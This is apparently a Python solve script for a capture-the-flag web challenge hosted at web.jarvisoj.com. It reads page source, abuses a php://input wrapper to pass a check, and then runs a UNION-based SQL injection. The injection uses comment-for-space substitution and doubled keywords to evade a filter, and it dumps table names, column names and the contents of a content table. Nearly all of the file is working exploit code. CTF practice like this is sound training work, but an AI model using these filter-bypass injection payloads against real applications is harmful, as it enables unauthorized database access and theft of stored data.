import base64
import codecs

import requests
import urllib

print(requests.get('http://web.jarvisoj.com:32780/index.php').text)
print(requests.get('http://web.jarvisoj.com:32780/index.phps').text)

print('----------------------------------------')

r = requests.get('http://web.jarvisoj.com:32780/index.php?a=php://input&id=s&b=.444444',
                 data='1112 is a nice lab!')
print(r.content.decode())

print(requests.get('http://web.jarvisoj.com:32780/^HT2mCpcvOLf').url)

sqli_target = 'http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php'

# Tables
payload = r"-1/*1*/uniunionon/*1*/selselectect/*1*/1,2,({})#"
r = requests.get(sqli_target, params={
    'id': payload.format(3333)
})
print(r.text)

r = requests.get(sqli_target, params={
    'id': payload.format(
        'SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA = DATABASE()'
            .replace(' ', '/*1*/').replace('SELECT', 'SELselectECT').replace('FROM', 'FRfromOM'))
})
print(r.text)

r = requests.get(sqli_target, params={
    'id': payload.format(
        'SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x{}'
            .format(codecs.encode('content'.encode(), 'hex').decode()).replace('SELECT', 'SELselectECT')
            .replace('FROM', 'FRfromOM')).replace(' ', '/*1*/')
})
print(r.text)

r = requests.get(sqli_target, params={
    'id': payload.format('SELECT GROUP_CONCAT(id,context,title) FROM content')
                 .replace('SELECT', 'SELselectECT').replace('FROM', 'FRfromOM').replace(' ', '/*1*/')
})
print(r.text)

